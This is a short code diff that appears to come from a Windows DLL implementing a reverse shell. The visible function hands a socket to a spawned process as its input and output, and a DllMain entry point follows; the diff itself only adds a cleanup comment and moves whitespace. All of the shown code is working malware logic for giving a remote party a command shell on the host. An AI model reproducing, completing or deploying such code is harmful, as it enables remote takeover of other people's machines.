@@ -49,12 +49,14 @@ int shell(LPWSTR server, unsigned int port) {
     sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); // Tell it which other properties we're using
     sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket; // Set all I/O to the socket
     CreateProcessW(NULL, commandName, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+
+    // Clean up after reverse shell process completes
     WaitForSingleObject(pinfo.hProcess, INFINITE);
     CloseHandle(pinfo.hProcess);
     CloseHandle(pinfo.hThread);
-
     closesocket(socket);
     WSACleanup();
+
     return 0;
 }
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
